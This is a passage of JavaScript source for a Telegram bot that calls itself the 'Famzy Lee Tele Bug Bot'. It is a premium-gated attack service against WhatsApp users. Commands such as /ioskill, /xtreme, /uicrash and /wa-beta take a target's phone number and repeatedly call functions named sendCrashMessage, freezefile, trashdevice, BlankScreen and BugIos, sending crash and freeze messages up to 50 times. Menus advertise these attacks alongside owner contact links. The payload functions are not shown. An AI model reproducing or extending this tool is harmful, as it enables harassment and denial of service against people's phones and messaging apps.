    await XeonXRobust(target, { ptcp: true });
    await freezefile(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("lockios", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
           await BugIos(target);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('Process completed.');
});
bot.command("ioskill", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
           await BugIos(target);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('Process completed.');
});
bot.command("famzy", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses 10 kali
  for (let i = 0; i < 20; i++) {
  await uibuglogger(target);
  await trashdevice(target);
    await CONTRA(target, { ptcp: true });
    await freezefile(target, { ptcp: true });
    systemUi(target, ptcp = false );
    await sendCrashMessage(target, quoted = false);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("xtreme", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses 10 kali
  for (let i = 0; i < 50; i++) {
    await uibuglogger(target);
    await trashdevice(target);
    await HardUi(target, ptcp = false );  
    await CrashUihard(target, options = false); 
    await HardUi(target, ptcp = false );  
    await Crashmetabeta(target, options = false);
    await CrashUihard(target, options = false); 
    await sendCrashMessage(target, quoted = false);
    await CrashUihard(target, options = false); 
    await sendCrashMessage(target, quoted = false);
    await CONTRA(target, { ptcp: true });
    await freezefile(target, { ptcp: true });
    await Crashmetabeta(target, options = false);
    await systemUi(target, ptcp = false );
    await thunderblast_notif(target);
    await f10(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await newsLetter(target);
    
    
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("uicrash", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses 8 kali
  for (let i = 0; i < 8; i++) {
    HardUi(target, ptcp = false );  
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("famzylee", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

// Melakukan proses 10 kali
  for (let i = 0; i < 10; i++) {
    await sendCrashMessage(target, quoted = false);
    await CONTRA(target, { ptcp: true });
    await freezefile(target, { ptcp: true });
    systemUi(target, Ptcp = false);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("nervous", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    if (!isPremium(userId)) {
        return ctx.reply('NO ACCESS ❌');
    }
  if (!q) {
    return ctx.reply(`EXAMPLE : / 628xxx`);
  }
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  await prosesrespone(target, ctx);
  for (let i = 0; i < 20; i++) {
  await inva(target, Ptcp = true)
  await functes(target)
  await uibuglogger(target);
  await trashdevice(target);
  await CONTRA(target, { ptcp: true });
  await inva(target, Ptcp = true)
}
  await donerespone(target, ctx);
  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁');
});
bot.command("wa-beta", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    if (!isPremium(userId)) {
        return ctx.reply('NO ACCESS ❌');
    }
  if (!q) {
    return ctx.reply(`EXAMPLE : / 628xxx`);
  }
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  await prosesrespone(target, ctx);
  for (let i = 0; i < 20; i++) {
  await GHOST(target)
  await sendCrashBetaNew(target, quoted = true);
  await invis(target, Ptcp = true)
  await sendCrashBetaNew(target, quoted = true);
  await invis(target, Ptcp = true)
  await inva(target, Ptcp = true)
  await functes(target)
  await GHOST(target)
}
  await donerespone(target, ctx);
  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁');
});
bot.command("voidlee", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    if (!isPremium(userId)) {
        return ctx.reply('NO ACCESS ❌');
    }
  if (!q) {
    return ctx.reply(`EXAMPLE : / 628xxx`);
  }
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  await prosesrespone(target, ctx);
  for (let i = 0; i < 20; i++) {
  await inva(target, Ptcp = true)
  await functes(target)
  await uibuglogger(target);
  await trashdevice(target);
}
  await donerespone(target, ctx);
  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁');
});
bot.command("fawaz", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    if (!isPremium(userId)) {
        return ctx.reply('NO ACCESS ❌');
    }
  if (!q) {
    return ctx.reply(`EXAMPLE : / 628xxx`);
  }
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  await prosesrespone(target, ctx);
  for (let i = 0; i < 20; i++) {
  await killui(target, Ptcp = true);
  await func1(target)
  await killui(target, Ptcp = true);
  await func1(target)
  await inva(target, Ptcp = true)
  await DocBug(target)
  await killui(target, Ptcp = true);
  await trashdevice(target);
  await DocBug(target)
  await inva(target, Ptcp = true)
  await killui(target, Ptcp = true);
  await inva(target, Ptcp = true)
  await functes(target)
  await inva(target, Ptcp = true)
  await trashdevice(target);
  await DocBug(target)
  await killui(target, Ptcp = true);
  await inva(target, Ptcp = true)
  await uibuglogger(target);
  await trashdevice(target);
  await inva(target, Ptcp = true)
  await DocBug(target)
  await killui(target, Ptcp = true);
  await trashdevice(target);
  await killui(target, Ptcp = true);
  await functes(target)
  await trashdevice(target);
  await DocBug(target)
  await killui(target, Ptcp = true);
}
  await donerespone(target, ctx);
  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁');
});
bot.command("lekanfrez", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    if (!isPremium(userId)) {
        return ctx.reply('NO ACCESS ❌');
    }
  if (!q) {
    return ctx.reply(`EXAMPLE : / 628xxx`);
  }
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  await prosesrespone(target, ctx);
  for (let i = 0; i < 20; i++) {
  await CONTRA3(target, Ptcp = true);
  await CONTRA(target, { ptcp: true });
  await CONTRA2(target, Ptcp = true);
}
  await donerespone(target, ctx);
  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁');
});
bot.start(ctx => {
  const menuMessage = `
𝗔𝗺 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗙𝗮𝘄𝗮𝘇 𝗟𝗲𝗸𝗮𝗻
𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗨𝘀𝗶𝗻𝗴 𝗔𝗻𝗱 𝗔𝗹𝘄𝗮𝘆𝘀 𝗗𝗼𝗻𝗮𝘁𝗲 𝗠𝘆 𝘄𝗼𝗿𝗸𝘀
𝗔𝗻𝗱 𝗗𝗼𝗻'𝘁 𝗙𝗼𝗿𝗴𝗲𝘁 𝗧𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝗠𝘆 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 😁☺️
Happy ${greeting} !
╭╺╼━─━■「 ⚠️𝕭𝖊𝖜𝖆𝖗𝖊 𝕺𝖋 𝕴𝖙 𝕭𝖗𝖚𝖍⚠️ 」■━━─━╾╸
│ 
│ 𝑌𝑒𝑎𝒉 👌! 
│ W⃫  h⃫  a⃫  t⃫   I⃫  f⃫   I⃫   K⃫  i⃫  l⃫  l⃫  s⃫  
│
├╺╼━─━■「 📑 FEATURE 」■━━─━╾╸
│ hello sc famzy users
╰━━━━━━━━━━━━━━━━⬣
> © 𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐨𝐭
`;

  const photoUrl = "https://i.ibb.co/BHyPGJds/shaban-md.jpg"; 


const keyboard = [
    [
        { text: "𝐹𝑎𝑚𝑧𝑦𝐵𝑢𝑔𝑀𝑒𝑛𝑢", callback_data: "bugmenu" },
        { text: "𝐷𝑒𝑣 𝐹𝑎𝑚𝑧𝑦", url: "https://t.me/famzzy_lee" }
    ],
    [
        { text: "ᴛʜᴀɴᴋꜱᴛᴏ", callback_data: "thanksto" },
        { text: "ᴍᴇɴᴜ", callback_data: "menu" },
        { text: "ᴏᴡɴᴇʀᴍᴇɴᴜ", callback_data: "ownermenu" }
    ],
];

  
  ctx.replyWithPhoto(photoUrl, {
    caption: menuMessage,
    reply_markup: {
      inline_keyboard: keyboard
    }
  });
});
bot.action("ownermenu", (ctx) => {
  ctx.answerCbQuery(); // Memberi umpan balik bahwa tombol ditekan
  const greeting = new Date().getHours() < 12 ? "Morning" : new Date().getHours() < 18 ? "Afternoon" : "Evening";
  const menu = `
𝗔𝗺 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗙𝗮𝘄𝗮𝘇 𝗟𝗲𝗸𝗮𝗻
𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗨𝘀𝗶𝗻𝗴 𝗔𝗻𝗱 𝗔𝗹𝘄𝗮𝘆𝘀 𝗗𝗼𝗻𝗮𝘁𝗲 𝗠𝘆 𝘄𝗼𝗿𝗸𝘀
𝗔𝗻𝗱 𝗗𝗼𝗻'𝘁 𝗙𝗼𝗿𝗴𝗲𝘁 𝗧𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝗠𝘆 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 😁☺️ ${greeting} !
ᝄ ⌜ 𝙊 𝙬 𝙣 𝙚 𝙧 𝙈 𝙚 𝙣 𝙪 ⌟
䒘 > /delprem
䒘 > /addprem
䒘 > /statusprem
䒘 > /status
⟣──────────
> © 𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐨𝐭
  `;

  const keyboard = [[{
    text: "Contact Owner",
    url: "https://wa.me/2348146895993"
  }]];

  ctx.replyWithPhoto("https://i.ibb.co/BHyPGJds/shaban-md.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  }).then(() => {
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/eqteo3.mp3" 
    });
  });
});
bot.action("thaksto", (ctx) => {
  ctx.answerCbQuery(); // Memberi umpan balik bahwa tombol ditekan
  const greeting = new Date().getHours() < 12 ? "Morning" : new Date().getHours() < 18 ? "Afternoon" : "Evening";
  const menu = `
   💀 𝗔𝗺 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗙𝗮𝘄𝗮𝘇 𝗟𝗲𝗸𝗮𝗻
𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗨𝘀𝗶𝗻𝗴 𝗔𝗻𝗱 𝗔𝗹𝘄𝗮𝘆𝘀 𝗗𝗼𝗻𝗮𝘁𝗲 𝗠𝘆 𝘄𝗼𝗿𝗸𝘀
𝗔𝗻𝗱 𝗗𝗼𝗻'𝘁 𝗙𝗼𝗿𝗴𝗲𝘁 𝗧𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝗠𝘆 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 😁☺️

Selamat ${greeting} !
ᝄ ⌜ C R E A D I T ⌟
䒘 > God Creator
䒘 > Dev Fawaz Lekan
⟣──────────
  `;

  const keyboard = [[{
    text: "Contact Owner",
    url: "https://wa.me/2348146895993"
  }]];

  ctx.replyWithPhoto("https://i.ibb.co/VWZy3qxT/shaban-md.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  }).then(() => {
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/eqteo3.mp3" 
    });
  });
});
bot.action("menu", (ctx) => {
  ctx.answerCbQuery(); // Memberi umpan balik bahwa tombol ditekan
  const greeting = new Date().getHours() < 12 ? "Morning" : new Date().getHours() < 18 ? "Afternoon" : "Evening";
  const menu = `
   𝗔𝗺 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗙𝗮𝘄𝗮𝘇 𝗟𝗲𝗸𝗮𝗻
𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗨𝘀𝗶𝗻𝗴 𝗔𝗻𝗱 𝗔𝗹𝘄𝗮𝘆𝘀 𝗗𝗼𝗻𝗮𝘁𝗲 𝗠𝘆 𝘄𝗼𝗿𝗸𝘀
𝗔𝗻𝗱 𝗗𝗼𝗻'𝘁 𝗙𝗼𝗿𝗴𝗲𝘁 𝗧𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝗠𝘆 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 😁☺️..       
Selamat ${greeting} !
╭╺╼━─━■「 Display Menu 」■━━─━╾╸
│ 
│ 𝑌𝑒𝑎𝒉 👌! 
│ W⃫  h⃫  a⃫  t⃫   I⃫  f⃫   I⃫   K⃫  i⃫  l⃫  l⃫  s⃫  
│
├╺╼━─━■「 📑 FEATURE 」■━━─━╾╸
│❀  /brat
│❀  /enc 
│❀  /gpt
│❀  /ytmp3
│❀  /play
╰━━━━━━━━━━━━━━━━⬣
> © 𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐨𝐭
  `;

  const keyboard = [[{
    text: "Contact Owner",
    url: "https://wa.me/2348146895993"
  }]];

  ctx.replyWithPhoto("https://i.ibb.co/VWZy3qxT/shaban-md.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  }).then(() => {
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/eqteo3.mp3" 
    });
  });
});
bot.action("bugmenu", (ctx) => {
  ctx.answerCbQuery(); // Memberi umpan balik bahwa tombol ditekan
  const greeting = new Date().getHours() < 12 ? "Morning" : new Date().getHours() < 18 ? "Afternoon" : "Evening";
  const menu = `
┏╺╼━─━■「 ᏔᎬᏞᏟϴᎷᎬ ҒᎪᎷᏃᎽ ႮՏᎬᎡՏ 」■━━─━╾╸
│   𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐮𝐠 𝐁𝐨𝐭 𝐁𝐲 𝐅𝐚𝐰𝐚𝐳 𝐋𝐞𝐤𝐚𝐧
┗━━━┅┅┅┅┅┅┉┉┉┉┉┉┉┄┄┅┅╾╺

╺╼━─━■「☣𝐁𝐔𝐆 𝐍𝐔𝐌☣」■━━─━╾╸
│☪ /crash 234xxx
│☪ /crash2 234xxx

╺╼━─━■「☤ 𝐈𝐎𝐒 𝐊𝐈𝐋𝐋 ☤」■━━─━╾╸
│☪ /ioskill 234xxx
│☪ /lockios 234xxx

│  ⌜☬ 𝐅𝐀𝐌𝐙𝐘 𝐁𝐔𝐆 ☬⌟ ■━━─━╾╸
│☪ /fawazlekan 234xxx
│☪ /famzy 234xxx
│☪ /famzylee 234xxx
│☪ /lekanfrez 234xxx

╺╼━─━■「᯼ 𝐂𝐑𝐀𝐒𝐇 𝐔𝐈 ᯼」■━━─━╾╸
│☪ /conviteui 234xxx
│☪ /sysui 234xxx
│☪ /lockui 234xxx
│☪ /uicrash 234xxx
│☪ /crashflow 234xxx
│☪ /nervous 234xxx
│☪ /wa-beta 234xxx
│☪ /fawaz 234xxx

╺╼━─━■「〠 𝐃𝐈𝐄  𝐁𝐔𝐆 〠」■━━─━╾╸
│☪ /die 234xxx

╺╼━─━■「╼ 𝐅𝐀𝐋𝐋𝐈𝐍𝐆 𝐁𝐔𝐆 ╾」■━━─━╾╸
│☪ /xtreme 234xxx
│☪ /voidlee 234xxx
┗─━─━─━─━─━─━─━─╾╾╾╾╾╾╾╾╾

> © 𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐨𝐭
  `;

  const keyboard = [[{
    text: "Contact Owner",
    url: "https://wa.me/2348146895993"
  }]];

  ctx.replyWithPhoto("https://i.ibb.co/BHyPGJds/shaban-md.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  }).then(() => {
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/eqteo3.mp3" 
    });
  });
});
//Menu Awal
bot.command("bugmenu", ctx => {
  const menu = `
┏╺╼━─━■「 ᏔᎬᏞᏟϴᎷᎬ ҒᎪᎷᏃᎽ ႮՏᎬᎡՏ 」■━━─━╾╸
│   𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐮𝐠 𝐁𝐨𝐭 𝐁𝐲 𝐅𝐚𝐰𝐚𝐳 𝐋𝐞𝐤𝐚𝐧
┗━━━┅┅┅┅┅┅┉┉┉┉┉┉┉┄┄┅┅╾╺

╺╼━─━■「☣𝐁𝐔𝐆 𝐍𝐔𝐌☣」■━━─━╾╸
│☪ /crash 234xxx
│☪ /crash2 234xxx

╺╼━─━■「☤ 𝐈𝐎𝐒 𝐊𝐈𝐋𝐋 ☤」■━━─━╾╸
│☪ /ioskill 234xxx
│☪ /lockios 234xxx

│  ⌜☬ 𝐅𝐀𝐌𝐙𝐘 𝐁𝐔𝐆 ☬⌟ ■━━─━╾╸
│☪ /fawazlekan 234xxx
│☪ /famzy 234xxx
│☪ /famzylee 234xxx
│☪ /lekanfrez 234xxx

╺╼━─━■「᯼ 𝐂𝐑𝐀𝐒𝐇 𝐔𝐈 ᯼」■━━─━╾╸
│☪ /conviteui 234xxx
│☪ /sysui 234xxx
│☪ /lockui 234xxx
│☪ /uicrash 234xxx
│☪ /crashflow 234xxx
│☪ /nervous 234xxx
│☪ /wa-beta 234xxx
│☪ /fawaz 234xxx

╺╼━─━■「〠 𝐃𝐈𝐄  𝐁𝐔𝐆 〠」■━━─━╾╸
│☪ /die 234xxx

╺╼━─━■「╼ 𝐅𝐀𝐋𝐋𝐈𝐍𝐆 𝐁𝐔𝐆 ╾」■━━─━╾╸
│☪ /xtreme 234xxx
│☪ /voidlee 234xxx
┗─━─━─━─━─━─━─━─╾╾╾╾╾╾╾╾╾

> © 𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐨𝐭
  `;

  const keyboard = [[{
    text: "Contact Owner",
    url: "https://wa.me/2348146895993"
  }]];

  ctx.replyWithPhoto("https://i.ibb.co/BHyPGJds/shaban-md.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  }).then(() => {
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/eqteo3.mp3" 
    });
  });
});
bot.command("thanksto", ctx => {
  const menu = `
𝗔𝗺 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗙𝗮𝘄𝗮𝘇 𝗟𝗲𝗸𝗮𝗻
𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗨𝘀𝗶𝗻𝗴 𝗔𝗻𝗱 𝗔𝗹𝘄𝗮𝘆𝘀 𝗗𝗼𝗻𝗮𝘁𝗲 𝗠𝘆 𝘄𝗼𝗿𝗸𝘀
𝗔𝗻𝗱 𝗗𝗼𝗻'𝘁 𝗙𝗼𝗿𝗴𝗲𝘁 𝗧𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝗠𝘆 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 😁☺️..       

Selamat ${greeting} !
ᝄ ⌜ C R E A D I T ⌟
䒘 > God Creator
䒘 > Fawaz Lekan
⟣──────────
    `;

  const keyboard = [[{
    text: "Contact Owner",
    url: "https://wa.me/2348146895993"
  }]];

  ctx.replyWithPhoto("https://i.ibb.co/BHyPGJds/shaban-md.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  }).then(() => {
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/eqteo3.mp3" 
    });
  });
});
bot.command("menu", ctx => {
  const menu = `
𝗔𝗺 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗙𝗮𝘄𝗮𝘇 𝗟𝗲𝗸𝗮𝗻
𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗨𝘀𝗶𝗻𝗴 𝗔𝗻𝗱 𝗔𝗹𝘄𝗮𝘆𝘀 𝗗𝗼𝗻𝗮𝘁𝗲 𝗠𝘆 𝘄𝗼𝗿𝗸𝘀
𝗔𝗻𝗱 𝗗𝗼𝗻'𝘁 𝗙𝗼𝗿𝗴𝗲𝘁 𝗧𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝗠𝘆 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 😁☺️..       

Selamat ${greeting} !
╭╺╼━─━■「 DISPLAY MENU」■━━─━╾╸
│ 
│ 𝑌𝑒𝑎𝒉 👌! 
│ W⃫  h⃫  a⃫  t⃫   I⃫  f⃫   I⃫   K⃫  i⃫  l⃫  l⃫  s⃫  
│
├╺╼━─━■「 📑 FEATURE 」■━━─━╾╸
│❀  /brat
│❀  /enc 
│❀  /gpt
│❀  /ytmp3
│❀  /play
╰━━━━━━━━━━━━━━━━⬣
> © 𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐨𝐭
    `;

  const keyboard = [[{
    text: "Contact Owner",
    url: "https://t.me/famzzy_lee"
  }]];

  ctx.replyWithPhoto("https://i.ibb.co/BHyPGJds/shaban-md.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  }).then(() => {
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/eqteo3.mp3" 
    });
  });
});
bot.command("ownermenu", ctx => {
  const menu = `
   𝗔𝗺 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗙𝗮𝘄𝗮𝘇 𝗟𝗲𝗸𝗮𝗻
𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗨𝘀𝗶𝗻𝗴 𝗔𝗻𝗱 𝗔𝗹𝘄𝗮𝘆𝘀 𝗗𝗼𝗻𝗮𝘁𝗲 𝗠𝘆 𝘄𝗼𝗿𝗸𝘀
𝗔𝗻𝗱 𝗗𝗼𝗻'𝘁 𝗙𝗼𝗿𝗴𝗲𝘁 𝗧𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝗠𝘆 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 😁☺️ ${greeting} !
ᝄ ⌜ 𝙊 𝙬 𝙣 𝙚 𝙧 𝙈 𝙚 𝙣 𝙪 ⌟
䒘 > /delprem
䒘 > /addprem
䒘 > /statusprem
䒘 > /status
⟣──────────
